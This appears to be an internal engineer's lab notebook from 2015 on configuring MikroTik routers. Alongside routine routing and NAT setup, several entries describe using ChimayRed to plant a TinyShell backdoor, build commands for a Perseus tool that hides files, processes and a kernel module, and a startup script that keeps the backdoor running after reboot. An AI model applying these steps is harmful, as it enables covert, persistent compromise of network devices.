TR-Core Switch Route: 192.168.88.0/27 -> 172.20.100.6  (This gives the Perseus LANLocal Area Network 30 host IPs)

4/3/2015

Changed RB493G ether1 IP to 172.20.100.6/30.
Changed RB493G ether2 IP to 192.168.88.1/24.
Default IP: 192.168.88.1/24
Figure out how to run ChimayRed and TinyShell (TshPatcher).

4/8/2015

Unable to connect RB493G to Console server.  Checked MT website and confirmed settings, but no luck.
Downloaded and upgraded MT f/w to v6.27
Move Windows VMVirtual Machine to VLAN-602 (Perseus Internal).
Use Winbox to upload new f/w.  Copy "routeros-mipsbe-6.27.npk" using the Files List window.

Select System -> Reboot.  Once rebooted, the new version number (6.27) will be seen in the Winbox Title.



4/9/2015
Setup TR-Core route to 192.168.88.0/27
ip route 192.168.88.0 255.255.255.224 172.20.100.6 name Perseus-MT_RB493G

Add default route (0.0.0.0/0 via 172.20.100.5) for MT (IP -> Routes): 

Setup ACLAccess Control List (on TR-Core) to restrict VLANVirtual Local Area Network access (see Access List Configuration section below for settings).
Configure NATNetwork Address Translation on RS493G using the following rule (IP -> Firewall -> NATNetwork Address Translation): 

Delete 'Serial0' port under System -> Console.
Setup NTPNetwork Time Protocol client (System -> SNTP Client): 

Apply ACLs to VLAN601 (Perseus WANWide Area Network)

4/10/2015

Worked with Bingham to throw ChimayRed and TinyShell on MT RB-493G.
Here is the order exploits/tools are used operationally:  
Package TinyShell with port, key, architecture, and shell (optional)
Use ChimayRed to upload exploit (TinyShell) to MT.  Requires access to port 8291 and 80.
Connect to TinyShell.  You are now in an encrypted session between ICON and the MT.
Upload BusyBox and/or Perseus.
For more specific details refer to the step-by-step guide Chimay Red, TinyShell, and BusyBox Quick Start Guide  .

User #14587667 Bug??: When I hide busybox it no longer lets me use it.



Talked with User #73764 on the phone.  Secure delete is kicking and deleting the files Perseus should be hiding.  User #73764 needs to research this some more and will get back in touch with me tomorrow.

User #73765 requested configuration and log files of the Perseus installation and execution.  2015-04-16_063833-Perseus-Install_Log.log


User #73764 and User #73765 came over to DD2 and User #73764 worked with me to troubleshoot the MT.  It turns out that the kernel had been deleted by secure delete.  User #73764 and User #73765 took the MT back with them to TP to perform further analysis.

 
4/27/2015
Re-configured MT with WAN, LAN, NATNetwork Address Translation settings.  Device had been bricked and was reset by TP.

User #14587667 Shouldn't this be hidden.  It was built with this command "python perseus_1.1.0.0b1_routeros6_mips.zip -f /flash/boot/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /tmp/tshd-mipsbe -d /flash/boot/hidden -d /tmp/tshd-mipsbe -S /flash/boot/hidden/start -s 1 -m /flash/boot/hidden/mcc.ko -r /tmp/dont_panic deploy"Resolution: I spoke with User #73764 and Perseus hides the absolute path.  In this case /tmp is a symlink to /rw/tmp and /rw/tmp is a symlink to /flash/rw/tmp.  So /tmp is a symlink to /flash/rw/tmp.  The full path needed to hide /tmp/tshd-mipsbe is actually /flash/rw/tmp/tsh-mipsbe.



4/28/2015

Spoke with User #73764 to troubleshoot why /tmp/tshd-mipsbe is not hidden when running "ps ax" (Notes under 4/27/2015).
Refer to "2015-04-28_110134-Perseus-ICON_window1 TS process not hidden w new command" for logs.

User #14587667 Determine how to make TS startup after reboot.  User #73764 suggested placing a startup script in /flash/etc/rc.d/run.d/S99tsh which will launch TS.  Also need to upload TS to /flash/boot/hidden (/tmp is not persistent).



4/29/2015

Created startup script to make tsh persistent (/flash/etc/rc.d/run.d/S99tsh).
Although tsh is not hidden when run from /tmp/tshd-mipsbe, it is hidden when it is run from /flash/boot/hidden/tshd-mipsbe (after reboot).
Current parameters used to generate perseus:       python perseus_1.1.0.0b1_routeros6_mips.zip -f /flash/boot/hidden -f /flash/etc/rc.d/run.d/S99mcc -f /flash/etc/rc.d/run.d/S99tsh -d /flash/boot/hidden -p /flash/rw/tmp/tshd-mipsbe -S /flash/boot/hidden/start -s 1 -m /flash/boot/hidden/mcc.ko -r /flash/boot/hidden/dont_panic deploy

Tsh traffic does show up in Torch when executing commands from ICON 



Installed Cacti server (192.168.0.8/24)
Racked Cisco 2960 to extend MT network.  Added subnet 192.168.0.0/24.
Added VLANs 605, 606, 607 so hosts can be added to Cisco 2960/MT LAN2 for testing.

Configured RB493G to send syslog and SNMPSimple Network Management Protocol to Cacti server.
Fixed Cacti rsyslog config (/etc/rsyslog.conf) and added instructions to Linux confluence page.

User #73766 confirmed with CANDILIS that fluxwire 3.3 was successfully run on a MikroTik running ROS 6.27.  He did not confirm it was BE or LE.
I am having trouble running fluxwire 3.3 on the RB493G running ROS 6.27.  I was able to successfully create an Ubuntu flux node (using the same commands with the only difference being the target architecture).
I was unable to run fluxwire when perseus was installed.  The process never appeared in the process list.  I tried running it from both hidden and non-hidden directories.  As soon as I removed perseus, fluxwire ran just fine.This was not a Perseus bug.  See notes from 5/19 for solution.


5/19/2015
The fluxwire node will not start if you try to run it from outside the directory it resides in.  In other word, you must first cd to the binary's directory.

Ask User #73764 why they recommend /flash/boot.  Is it because secure-delete is quicker?


5/26/2015

Configured console server for RB493G and RB450G (Rack 6).
Username: admin
Password: <none>


Setup P2P link between RB493G and RB450G.
On 493G: ip address add address=10.0.0.1 netmask=255.255.255.252 interface=ether4 comment=To_RB450G_ether4
On 450G: ip address add address=10.0.0.2 netmask=255.255.255.252 interface=ether4 comment=To_RB493G_ether4


Setup additional LANLocal Area Network interface on RB450G:/ip address add address=192.168.20.1/24 interface=ether5


Setup RIP routing between RB493G and RB450G


On 493G: 

/routing rip interface add interface=ether4 comment="RIP to RB450"
/routing rip interface add interface=ether6
/routing rip set redistribute-connected=yes
/routing rip network add network=192.168.0.0/24
/routing rip network add network=10.0.0.0/30



On 450G: 

/routing rip interface add interface=ether4 comment="RIP to RB493"
/routing rip set redistribute-connected=yes
/routing rip network add network=192.168.20.0/24


Verify routes:  /routing rip route print



Notes

Perseus only deletes files/directories that are specified to be hidden.
If secure delete is not used, but mcc is revereted manually (using /tmp/busybox rmmod mcc) ...
To hide an executable, the absolute path to the binary must be specified using the -p option.  The MT uses many symlinks (ie. /tmp is a symlink for /flash/rw/tmp), so be sure to determine the absolute path.  You can use the "readlink -f <path>" command to show the absolute path. 

If ts is running from a hidden directory and perseus is removed (by touching trigger file), then the tshd process is no longer hidden and appears in the process list.  So if tsh was run from /flash/boot/hidden/tshd-mipsbe the directory /flash/boot/hidden is deleted, but /flash/boot/hidden/tshd-mipsbe shows up in the process list (ps ax).
